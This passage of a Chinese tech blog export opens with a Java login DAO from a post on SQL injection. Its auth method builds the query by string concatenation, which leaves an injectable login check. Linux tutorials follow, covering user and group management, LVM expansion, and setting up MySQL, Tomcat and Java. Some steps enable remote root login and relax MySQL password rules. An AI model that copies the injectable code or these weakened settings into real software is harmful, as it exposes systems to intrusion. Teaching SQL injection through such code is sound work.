user.setGender(rs.getString(&quot;gender&quot;));                     user.setSalt(rs.getString(&quot;salt&quot;));            }        }catch(Exception e){            e.printStackTrace();            throw e;        }finally{            DBUtil.close(conn);        }        return user;    }    /**     * 增加用户信息(注册时用)     * @param u     * @throws Exception     */    public void save(User u)throws Exception{        //设置盐巴        String salt = new SecureRandomNumberGenerator().nextBytes().toString();        //设置撒多少次盐巴        int times = 2;        //生成密文        String encodedPassword = new SimpleHash(&quot;md5&quot;,u.getPwd(),salt,times).toString();        Connection con = null;        PreparedStatement pst = null;        try{            con = DBUtil.getConnection();            pst = con.prepareStatement(&quot;insert into t_user(username,pwd,realname,gender,salt) values (?,?,?,?,?)&quot;);            pst.setString(1,u.getUsername());            pst.setString(2,encodedPassword);            pst.setString(3,u.getName());            pst.setString(4,u.getGender());            pst.setString(5,salt);            pst.executeUpdate();        }catch(Exception e){            e.printStackTrace();            throw e;        }finally{            DBUtil.close(con);        }           }    /**     * 登录认证     * @param userName     * @param password     * @return     * @throws Exception     */    public boolean auth(String userName,String password) throws Exception{        Connection conn = null;        User user = findByUserName(userName);        if(user==null){            return false;        }        //得到密文        String encodePassword = new SimpleHash(&quot;md5&quot;,password,user.getSalt(),2).toString();        try {            conn = DBUtil.getConnection();            Statement state = conn.createStatement();            //            String sql = &quot;SELECT * &quot; +                         &quot;FROM t_user &quot;+                         &quot;WHERE username=&#39;&quot;+userName+&quot;&#39; &quot; +                         &quot;AND pwd=&#39;&quot;+encodePassword+&quot;&#39;&quot;;            //打印被执行的SQL语句            System.out.println(sql);            ResultSet rs = state.executeQuery(sql);            //            if(rs.next()){                return true;            }        } catch (Exception e) {            e.printStackTrace();        } finally{            if(conn != null){                DBUtil.close(conn);            }        }        return false;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 万能密码 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 用户和组管理</title>
      <link href="2018/08/26/linux-yong-hu-he-zu-guan-li/"/>
      <url>2018/08/26/linux-yong-hu-he-zu-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-用户和组管理"><a href="#Linux-用户和组管理" class="headerlink" title="Linux 用户和组管理"></a>Linux 用户和组管理</h1><p>Linux 操作系统是一个多用户操作系统，它允许多用户同时登录到系统上并使用资源。系统会根据账户来区分每个用户的文件，进程，任务和工作环境，使得每个用户工作都不受干扰。</p><h1 id="使用-Root-用户"><a href="#使用-Root-用户" class="headerlink" title="使用 Root 用户"></a>使用 Root 用户</h1><p>在实际生产操作中，我们基本上都是使用超级管理员账户操作 Linux 系统，也就是 Root 用户，Linux 系统默认是关闭 Root 账户的，我们需要为 Root 用户设置一个初始密码以方便我们使用。</p><h3 id="设置-Root-账户密码"><a href="#设置-Root-账户密码" class="headerlink" title="设置 Root 账户密码"></a>设置 Root 账户密码</h3><pre><code>sudo passwd root</code></pre><h3 id="切换到-Root"><a href="#切换到-Root" class="headerlink" title="切换到 Root"></a>切换到 Root</h3><pre><code>su</code></pre><h3 id="设置允许远程登录-Root"><a href="#设置允许远程登录-Root" class="headerlink" title="设置允许远程登录 Root"></a>设置允许远程登录 Root</h3><pre><code>nano /etc/ssh/sshd_config# Authentication:LoginGraceTime 120#PermitRootLogin without-password     //注释此行PermitRootLogin yes                             //加入此行StrictModes yes重启服务service ssh restart</code></pre><h1 id="用户账户说明"><a href="#用户账户说明" class="headerlink" title="用户账户说明"></a>用户账户说明</h1><h3 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h3><p>普通用户在系统上的任务是进行普通操作</p><h3 id="超级管理员"><a href="#超级管理员" class="headerlink" title="超级管理员"></a>超级管理员</h3><p>管理员在系统上的任务是对普通用户和整个系统进行管理。对系统具有绝对的控制权，能够对系统进行一切操作。用 root 表示，root 用户在系统中拥有最高权限，默认下 Ubuntu 用户的 root 用户是不能登录的。</p><h1 id="安装时创建的系统用户"><a href="#安装时创建的系统用户" class="headerlink" title="安装时创建的系统用户"></a>安装时创建的系统用户</h1><p>此用户创建时被添加到 admin 组中，在 Ubuntu 中，admin 组中的用户默认是可以使用 sudo 命令来执行只有管理员才能执行的命令的。如果不使用 <code>sudo</code> 就是一个普通用户。</p><h1 id="组账户说明"><a href="#组账户说明" class="headerlink" title="组账户说明"></a>组账户说明</h1><h3 id="私有组"><a href="#私有组" class="headerlink" title="私有组"></a>私有组</h3><p>当创建一个用户时没有指定属于哪个组，Linux 就会建立一个与用户同名的私有组，此私有组只含有该用户。</p><h3 id="标准组"><a href="#标准组" class="headerlink" title="标准组"></a>标准组</h3><p>当创建一个用户时可以选定一个标准组，如果一个用户同时属于多个组时，登录后所属的组为主组，其他的为附加组。</p><h1 id="账户系统文件说明"><a href="#账户系统文件说明" class="headerlink" title="账户系统文件说明"></a>账户系统文件说明</h1><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>每一行代表一个账号，众多账号是系统正常运行所必须的，例如 bin，nobody 每行定义一个用户账户，此文件对所有用户可读。每行账户包含如下信息：</p><p><code>root:x:0:0:root:/root:/bin/bash</code></p><ul><li><strong>用户名</strong>： 就是账号，用来对应 UID，root UID 是 0。</li><li><strong>口令</strong>： 密码，早期 UNIX 系统密码存在此字段，由于此文件所有用户都可以读取，密码容易泄露，后来这个字段数据就存放到 /etc/shadow 中，这里只能看到 X。</li><li><strong>用户标示号（UID）</strong>： 系统内唯一，root 用户的 UID 为 0，普通用户从 1000 开始，1-999 是系统的标准账户，500-65536 是可登陆账号。</li><li><strong>组标示号（GID）</strong>： 与 /etc/group 相关用来规定组名和 GID 相对应。</li><li><strong>注释</strong>： 注释账号</li><li><strong>宿主目录（主文件夹）</strong>： 用户登录系统后所进入的目录 root 在 /root/itcast</li><li><strong>命令解释器（shell）</strong>： 指定该用户使用的 shell ，默认的是 /bin/bash</li></ul><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p>为了增加系统的安全性，用户口令通常用 shadow passwords 保护。只有 root 可读。每行包含如下信息：<br><code>root:$6$Reu571.V$Ci/kd.OTzaSGU.TagZ5KjYx2MLzQv2IkZ24E1.yeTT3Pp4o/yniTjus/rRaJ92Z18MVy6suf1W5uxxurqssel.:17465:0:99999:7:::</code></p><ul><li>账号名称： 需要和 /etc/passwd 一致。</li><li>密码： 经过加密，虽然加密，但不表示不会被破解，该文件默认权限如下：<ul><li>rw——- 1 root root 1560 Oct 26 17:20 passwd-</li><li>只有root能都读写</li></ul></li><li>最近修改密码日期：  从1970-1-1起，到用户最后一次更改口令的天数</li><li>密码最小时间间隔： 从1970-1-1起，到用户可以更改口令的天数</li><li>密码最大时间间隔： 从1970-1-1起，必须更改的口令天数</li><li>密码到期警告时间： 在口令过期之前几天通知</li><li>密码到期后账号宽限时间</li><li>密码到期禁用账户时间： 在用户口令过期后到禁用账户的天数</li><li>保留</li></ul><h3 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h3><p>用户组的配置文件</p><p><code>root:x:0:</code></p><ul><li>用户组名称</li><li>用户组密码： 给用户组管理员使用，通常不用</li><li>GID： 用户组的ID</li><li>此用户支持的账号名称： 一个账号可以加入多个用户组，例如想要 itcast 加入 root 这个用户组，将该账号填入该字段即可 root❌0:root, icast 将用户进行分组是 Linux 对用户进行管理及控制访问权限的一种手段。一个中可以有多个用户，一个用户可以同时属于多个组。该文件对所有用户可读。</li></ul><h3 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h3><p>该文件用户定义用户组口令，组管理员等信息只有root用户可读。</p><p><code>root:\*::</code></p><ul><li>用户组名</li><li>密码列</li><li>用户组管理员的账号</li><li>用户组所属账号<h3 id="账户管理常用命"><a href="#账户管理常用命" class="headerlink" title="账户管理常用命"></a>账户管理常用命</h3><h4 id="增加用户"><a href="#增加用户" class="headerlink" title="增加用户"></a>增加用户</h4><pre><code>useradd 用户名useradd -u (UID号)useradd -p (口令)useradd -g (分组)useradd -s (SHELL)useradd -d (用户目录)</code></pre></li></ul><p>如：<code>useradd lusifer</code></p><p>增加用户名为 lusifer 的账户</p><h4 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h4><pre><code>usermod -u (新UID)usermod -d (用户目录)usermod -g (组名)usermod -s (SHELL)usermod -p (新口令)usermod -l (新登录名)usermod -L (锁定用户账号密码)usermod -U (解锁用户账号)</code></pre><p>如：<code>usermod -u 1024 -g group2 -G root lusifer</code></p><p>将 lusifer 用户 uid 修改为 1024，默认组改为系统中已经存在的 group2，并且加入到系统管理员组</p><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><pre><code>userdel 用户名 (删除用户账号)userdel -r 删除账号时同时删除目录</code></pre><p>如：<code>userdel -r lusifer</code></p><p>删除用户名为 lusifer 的账户并同时删除 lusifer 的用户目录</p><h3 id="组账户维护"><a href="#组账户维护" class="headerlink" title="组账户维护"></a>组账户维护</h3><pre><code>groupadd 组账户名 (创建新组)groupadd -g 指定组GIDgroupmod -g 更改组的GIDgroupmod -n 更改组账户名groupdel 组账户名 (删除指定组账户)</code></pre><h3 id="口令维护"><a href="#口令维护" class="headerlink" title="口令维护"></a>口令维护</h3><pre><code>passwd 用户账户名 (设置用户口令)passwd -l 用户账户名 (锁定用户账户)passwd -u 用户账户名 (解锁用户账户)passwd -d 用户账户名 (删除账户口令)gpasswd -a 用户账户名 组账户名 (将指定用户添加到指定组)gpasswd -d 用户账户名 组账户名 (将用户从指定组中删除)gpasswd -A 用户账户名 组账户名 (将用户指定为组的管理员)</code></pre><h4 id="用户和组状态"><a href="#用户和组状态" class="headerlink" title="用户和组状态"></a>用户和组状态</h4><pre><code>su 用户名(切换用户账户)id 用户名(显示用户的UID，GID)whoami (显示当前用户名称)groups (显示用户所属组)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux LVM 磁盘扩容</title>
      <link href="2018/08/16/linux-lvm-ci-pan-kuo-rong/"/>
      <url>2018/08/16/linux-lvm-ci-pan-kuo-rong/</url>
      
        <content type="html"><![CDATA[<h1 id="LVM-的基本概念"><a href="#LVM-的基本概念" class="headerlink" title="LVM 的基本概念"></a>LVM 的基本概念</h1><h3 id="物理卷-Physical-volume-PV"><a href="#物理卷-Physical-volume-PV" class="headerlink" title="物理卷 Physical volume (PV)"></a>物理卷 Physical volume (PV)</h3><p>可以在上面建立卷组的媒介，可以是硬盘分区，也可以是硬盘本身或者回环文件（loopback file）。物理卷包括一个特殊的 header，其余部分被切割为一块块物理区域（physical extents）。</p><h4 id="卷组-Volume-group-VG"><a href="#卷组-Volume-group-VG" class="headerlink" title="卷组 Volume group (VG)"></a>卷组 Volume group (VG)</h4><p>将一组物理卷收集为一个管理单元。</p><h4 id="逻辑卷-Logical-volume-LV"><a href="#逻辑卷-Logical-volume-LV" class="headerlink" title="逻辑卷 Logical volume (LV)"></a>逻辑卷 Logical volume (LV)</h4><p>虚拟分区，由物理区域（physical extents）组成。</p><h4 id="物理区域-Physical-extent-PE"><a href="#物理区域-Physical-extent-PE" class="headerlink" title="物理区域 Physical extent (PE)"></a>物理区域 Physical extent (PE)</h4><p>硬盘可供指派给逻辑卷的最小单位（通常为 4MB）。</p><h1 id="磁盘操作相关命令"><a href="#磁盘操作相关命令" class="headerlink" title="磁盘操作相关命令"></a>磁盘操作相关命令</h1><h4 id="df-h（查看挂载点）"><a href="#df-h（查看挂载点）" class="headerlink" title="df -h（查看挂载点）"></a><code>df -h</code>（查看挂载点）</h4><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/5EF5AB70A7864D6CB778E29F1E49ECE8/1848" alt></p><h4 id="lvdisplay（显示当前的-logical-volume）"><a href="#lvdisplay（显示当前的-logical-volume）" class="headerlink" title="lvdisplay（显示当前的 logical volume）"></a><code>lvdisplay</code>（显示当前的 logical volume）</h4><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/B46A16706BE84D7785ABDEDB2ABC8447/1850" alt></p><p>备注： 注意这里目前有两个，一个是文件系统所在的 volume，另一个是 swap 分区使用的 volume，当然，我们需要扩容的是第一个</p><h4 id="vgdisplay（显示当前的-volume-group）"><a href="#vgdisplay（显示当前的-volume-group）" class="headerlink" title="vgdisplay（显示当前的 volume group）"></a><code>vgdisplay</code>（显示当前的 volume group）</h4><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/28102956E5304EDB9F65AAB4B89F132A/1854" alt></p><h1 id="开始-LVM-扩容"><a href="#开始-LVM-扩容" class="headerlink" title="开始 LVM 扩容"></a>开始 LVM 扩容</h1><h3 id="查看-fdisk"><a href="#查看-fdisk" class="headerlink" title="查看 fdisk"></a>查看 fdisk</h3><pre><code>fdisk -l</code></pre><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/8F4B442E5D8347AA80C023E193659953/1856" alt></p><p>因为这台机器默认开启了 LVM，所以目前有一个 <code>extended</code>分区和一个<code>LVM</code> 分区，并且他们是完全重叠的。这是因为，LVM 分区作为一个虚拟的分区，完全占用了这个 extended 分区，原理图见下：<br><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/53A82CC632A94D21A2599C391E79EA61/1858" alt></p><p>因此，现在需要做的就是将 extended partition (<code>sda2</code>) 扩展到最大，然后创建一个新的 LVM logical partition (<code>sda6</code>)，用它来填满 sda2</p><h3 id="查看所有连接到电脑上的储存设备"><a href="#查看所有连接到电脑上的储存设备" class="headerlink" title="查看所有连接到电脑上的储存设备"></a>查看所有连接到电脑上的储存设备</h3><pre><code>disk -l |grep &#39;/dev&#39;</code></pre><h4 id="1-块磁盘效果图"><a href="#1-块磁盘效果图" class="headerlink" title="1 块磁盘效果图"></a>1 块磁盘效果图</h4><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/8E0985A5EA2C46C497CFC5DCB2EAD87B/1860" alt></p><p>2 块磁盘效果图（新增磁盘，尚未挂载）<br><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/8E87CFC5237D4B0A9E1A6A8805976569/1862" alt></p><h3 id="创建-sdb-分区"><a href="#创建-sdb-分区" class="headerlink" title="创建 sdb 分区"></a>创建 sdb 分区</h3><pre><code>fdisk /dev/sdbn    # 新建分区l    # 选择逻辑分区，如果没有，则首先创建扩展分区（p），然后再添加逻辑分区（硬盘：最多四个分区  P-P-P-P 或 P-P-P-E）</code></pre><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/93D8E728C55248EE82F285D4F05CA1F6/1864" alt></p><pre><code>回车回车回车w    # 写入磁盘分区</code></pre><h3 id="格式化磁盘"><a href="#格式化磁盘" class="headerlink" title="格式化磁盘"></a>格式化磁盘</h3><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/892B518A557C4A0EB276B13C47321F53/1867" alt></p><pre><code>mkfs -t ext4 /dev/sdb1</code></pre><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/BA2F4D79A22C44E6BCFA5E65947028D4/1866" alt></p><h3 id="创建-PV"><a href="#创建-PV" class="headerlink" title="创建 PV"></a>创建 PV</h3><pre><code>pvcreate /dev/sdb1</code></pre><h3 id="查看卷组"><a href="#查看卷组" class="headerlink" title="查看卷组"></a>查看卷组</h3><pre><code>pvscan</code></pre><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/41E6D108CF2F44198EA424D347F7E837/1869" alt></p><h3 id="扩容-VG"><a href="#扩容-VG" class="headerlink" title="扩容 VG"></a>扩容 VG</h3><pre><code>vgdisplay</code></pre><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/706E617A0E414CD98E818626EB74198D/1871" alt></p><pre><code>vgextend ubuntu-vg /dev/sdb1</code></pre><h3 id="扩容-LV"><a href="#扩容-LV" class="headerlink" title="扩容 LV"></a>扩容 LV</h3><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/7679140594AB463E83101E4BC2C55CAA/1873" alt></p><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/81FCD01AD5F64245BE31AABB7D422071/1875" alt></p><pre><code># 增加指定大小lvextend -L +30G /dev/ubuntu-vg/root# 按百分比扩容lvextend -l +100%FREE /dev/ubuntu-vg/root</code></pre><h3 id="刷新分区"><a href="#刷新分区" class="headerlink" title="刷新分区"></a>刷新分区</h3><pre><code>resize2fs /dev/ubuntu-vg/root</code></pre><h3 id="删除-unknown-device"><a href="#删除-unknown-device" class="headerlink" title="删除 unknown device"></a>删除 unknown device</h3><pre><code>pvscanvgreduce --removemissing ubuntu-vg</code></pre><p>注意：不要卸载扩容的磁盘，可能出现丢失数据或是系统无法启动</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 安装 MySQL</title>
      <link href="2018/08/12/linux-an-zhuang-mysql/"/>
      <url>2018/08/12/linux-an-zhuang-mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-安装-MySQL"><a href="#Linux-安装-MySQL" class="headerlink" title="Linux 安装 MySQL"></a>Linux 安装 MySQL</h1><h3 id="更新数据源"><a href="#更新数据源" class="headerlink" title="更新数据源"></a>更新数据源</h3><pre><code>apt-get update</code></pre><h3 id="安装-MySQL"><a href="#安装-MySQL" class="headerlink" title="安装 MySQL"></a>安装 MySQL</h3><pre><code>apt-get install mysql-server</code></pre><p>系统将提示您在安装过程中创建 root 密码。选择一个安全的密码，并确保你记住它，因为你以后需要它。接下来，我们将完成 MySQL 的配置。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>因为是全新安装，您需要运行附带的安全脚本。这会更改一些不太安全的默认选项，例如远程 root 登录和示例用户。在旧版本的 MySQL 上，您需要手动初始化数据目录，但 Mysql 5.7 已经自动完成了。</p><p>运行安全脚本：</p><pre><code>mysql_secure_installation</code></pre><p>这将提示您输入您在之前步骤中创建的 root 密码。您可以按 Y，然后 ENTER 接受所有后续问题的默认值，但是要询问您是否要更改 root 密码。您只需在之前步骤中进行设置即可，因此无需现在更改。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>按上边方式安装完成后，MySQL 应该已经开始自动运行了。要测试它，请检查其状态。</p><pre><code>lusifer@ubuntu:~$ systemctl status mysql.service● mysql.service - MySQL Community Server   Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)   Active: active (running) since Tue 2017-11-21 13:04:34 CST; 3min 24s ago Main PID: 2169 (mysqld)   CGroup: /system.slice/mysql.service           └─2169 /usr/sbin/mysqldNov 21 13:04:33 ubuntu systemd[1]: Starting MySQL Community Server...Nov 21 13:04:34 ubuntu systemd[1]: Started MySQL Community Server.</code></pre><h3 id="查看-MySQL-版本："><a href="#查看-MySQL-版本：" class="headerlink" title="查看 MySQL 版本："></a>查看 MySQL 版本：</h3><pre><code>mysqladmin -p -u root version</code></pre><h1 id="配置远程访问"><a href="#配置远程访问" class="headerlink" title="配置远程访问"></a>配置远程访问</h1><ul><li>修改配置文件<pre><code>nano /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre></li><li>注释掉(语句前面加上 # 即可)：<pre><code>bind-address = 127.0.0.1</code></pre></li><li>重启 MySQL<pre><code>service mysql restart</code></pre></li><li>登录 MySQL<pre><code>mysql -u root -p</code></pre></li><li>授权 root 用户允许所有人连接<pre><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;你的 mysql root 账户密码&#39;;</code></pre></li></ul><h1 id="因弱口令无法成功授权解决步骤"><a href="#因弱口令无法成功授权解决步骤" class="headerlink" title="因弱口令无法成功授权解决步骤"></a>因弱口令无法成功授权解决步骤</h1><ul><li>查看和设置密码安全级别<pre><code>select @@validate_password_policy;</code></pre><pre><code>set global validate_password_policy=0;</code></pre></li><li>查看和设置密码长度限制<pre><code>select @@validate_password_length;</code></pre><pre><code>set global validate_password_length=1;</code></pre></li></ul><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre><code>service mysql start</code></pre><h3 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h3><pre><code>service mysql stop</code></pre><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><pre><code>service mysql restart</code></pre><h1 id="其它配置"><a href="#其它配置" class="headerlink" title="其它配置"></a>其它配置</h1><p>修改配置 <code>mysqld.cnf</code> 配置文件</p><pre><code>vi /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><h3 id="配置默认字符集"><a href="#配置默认字符集" class="headerlink" title="配置默认字符集"></a>配置默认字符集</h3><p>在 <code>[mysqld]</code> 节点上增加如下配置</p><pre><code>[client]default-character-set=utf8</code></pre><p>在 <code>[mysqld]</code>节点底部增加如下配置</p><pre><code>default-storage-engine=INNODBcharacter-set-server=utf8collation-server=utf8_general_ci</code></pre><h3 id="配置忽略数据库大小写敏感"><a href="#配置忽略数据库大小写敏感" class="headerlink" title="配置忽略数据库大小写敏感"></a>配置忽略数据库大小写敏感</h3><p>在 <code>[mysqld]</code>节点底部增加如下配置</p><pre><code>lower-case-table-names = 1</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 安装 Tomcat</title>
      <link href="2018/08/12/linux-an-zhuang-tomcat/"/>
      <url>2018/08/12/linux-an-zhuang-tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-安装-Tomcat"><a href="#Linux-安装-Tomcat" class="headerlink" title="Linux 安装 Tomcat"></a>Linux 安装 Tomcat</h1><blockquote><p>此处以 Tomcat 8.5.23 为例</p></blockquote><p>下载地址<br><a href="https://tomcat.apache.org/" target="_blank" rel="noopener">https://tomcat.apache.org/</a></p><h1 id="解压缩并移动到指定目录"><a href="#解压缩并移动到指定目录" class="headerlink" title="解压缩并移动到指定目录"></a>解压缩并移动到指定目录</h1><h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><pre><code>tar -zxvf apache-tomcat-8.5.23.tar.gz</code></pre><h3 id="变更目录名"><a href="#变更目录名" class="headerlink" title="变更目录名"></a>变更目录名</h3><pre><code>mv apache-tomcat-8.5.23 tomcat</code></pre><h3 id="移动目录"><a href="#移动目录" class="headerlink" title="移动目录"></a>移动目录</h3><pre><code>mv tomcat/ /usr/local/</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre><code>/usr/local/tomcat/bin/startup.sh</code></pre><h3 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h3><pre><code>/usr/local/tomcat/bin/shutdown.sh</code></pre><h3 id="目录内执行脚本"><a href="#目录内执行脚本" class="headerlink" title="目录内执行脚本"></a>目录内执行脚本</h3><pre><code>./startup.sh</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 安装 Java</title>
      <link href="2018/08/12/linux-an-zhuang-java/"/>
      <url>2018/08/12/linux-an-zhuang-java/</url>
      
        <content type="html"><![CDATA[<blockquote><p>此处以 JDK 1.8.0_152 为例</p></blockquote><h1 id="解压缩并移动到指定目录"><a href="#解压缩并移动到指定目录" class="headerlink" title="解压缩并移动到指定目录"></a>解压缩并移动到指定目录</h1><h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><pre><code>tar -zxvf jdk-8u152-linux-x64.tar.gz</code></pre><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><pre><code>mkdir -p /usr/local/java</code></pre><h3 id="移动安装包"><a href="#移动安装包" class="headerlink" title="移动安装包"></a>移动安装包</h3><pre><code>mv jdk1.8.0_152/ /usr/local/java/</code></pre><h3 id="设置所有者"><a href="#设置所有者" class="headerlink" title="设置所有者"></a>设置所有者</h3><pre><code>chown -R root:root /usr/local/java/</code></pre><h1 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h1><h3 id="配置系统环境变量"><a href="#配置系统环境变量" class="headerlink" title="配置系统环境变量"></a>配置系统环境变量</h3><pre><code>nano /etc/environment</code></pre><h3 id="添加如下语句"><a href="#添加如下语句" class="headerlink" title="添加如下语句"></a>添加如下语句</h3><pre><code>PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;export JAVA_HOME=/usr/local/java/jdk1.8.0_152export JRE_HOME=/usr/local/java/jdk1.8.0_152/jreexport CLASSPATH=$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib</code></pre><h3 id="配置用户环境变量"><a href="#配置用户环境变量" class="headerlink" title="配置用户环境变量"></a>配置用户环境变量</h3><pre><code>nano /etc/profile</code></pre><h3 id="添加如下语句-1"><a href="#添加如下语句-1" class="headerlink" title="添加如下语句"></a>添加如下语句</h3><pre><code>if [ &quot;$PS1&quot; ]; then  if [ &quot;$BASH&quot; ] &amp;&amp; [ &quot;$BASH&quot; != &quot;/bin/sh&quot; ]; then    # The file bash.bashrc already sets the default PS1.    # PS1=&#39;\h:\w\$ &#39;    if [ -f /etc/bash.bashrc ]; then      . /etc/bash.bashrc    fi  else    if [ &quot;`id -u`&quot; -eq 0 ]; then      PS1=&#39;# &#39;    else      PS1=&#39;$ &#39;    fi  fifiexport JAVA_HOME=/usr/local/java/jdk1.8.0_152export JRE_HOME=/usr/local/java/jdk1.8.0_152/jreexport CLASSPATH=$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/libexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH:$HOME/binif [ -d /etc/profile.d ]; then  for i in /etc/profile.d/*.sh; do    if [ -r $i ]; then      . $i    fi  done  unset ifi</code></pre><h3 id="使用户环境变量生效"><a href="#使用户环境变量生效" class="headerlink" title="使用户环境变量生效"></a>使用户环境变量生效</h3><pre><code>source /etc/profile</code></pre><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><pre><code>root@UbuntuBase:/usr/local/java# java -versionjava version &quot;1.8.0_152&quot;Java(TM) SE Runtime Environment (build 1.8.0_152-b16)Java HotSpot(TM) 64-Bit Server VM (build 25.152-b16, mixed mode)</code></pre><h3 id="为其他用户更新用户环境变量"><a href="#为其他用户更新用户环境变量" class="headerlink" title="为其他用户更新用户环境变量"></a>为其他用户更新用户环境变量</h3><pre><code>su lusifersource /etc/profile</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 文件权限管理</title>
      <link href="2018/08/07/linux-wen-jian-quan-xian-guan-li/"/>
      <url>2018/08/07/linux-wen-jian-quan-xian-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-文件权限管理"><a href="#Linux-文件权限管理" class="headerlink" title="Linux 文件权限管理"></a>Linux 文件权限管理</h1><h3 id="查看文件和目录的权限"><a href="#查看文件和目录的权限" class="headerlink" title="查看文件和目录的权限"></a>查看文件和目录的权限</h3><p>ls –al<code>使用 ls 不带参数只显示文件名称，通过ls –al</code> 可以显示文件或者目录的权限信息。</p><p><code>ls -l 文件名</code> 显示信息包括：文件类型 (<code>d</code> 目录，<code>-</code>普通文件，<code>l</code> 链接文件)，文件权限，文件的用户，文件的所属组，文件的大小，文件的创建时间，文件的名称</p><p><code>-rw-r--r-- 1 lusifer lusifer 675 Oct 26 17:20 .profile</code></p><ul><li><code>-</code>：普通文件</li><li><code>rw-</code>：说明用户 lusifer 有读写权限，没有运行权限</li><li><code>r--</code>：表示用户组 lusifer 只有读权限，没有写和运行的权限</li><li><code>r--</code>：其他用户只有读权限，没有写权限和运行的权限</li><li><table><thead><tr><th>-rw-r--r--</th><th>1</th><th>lusifer</th><th>lusifer</th><th>675</th><th>Oct 26 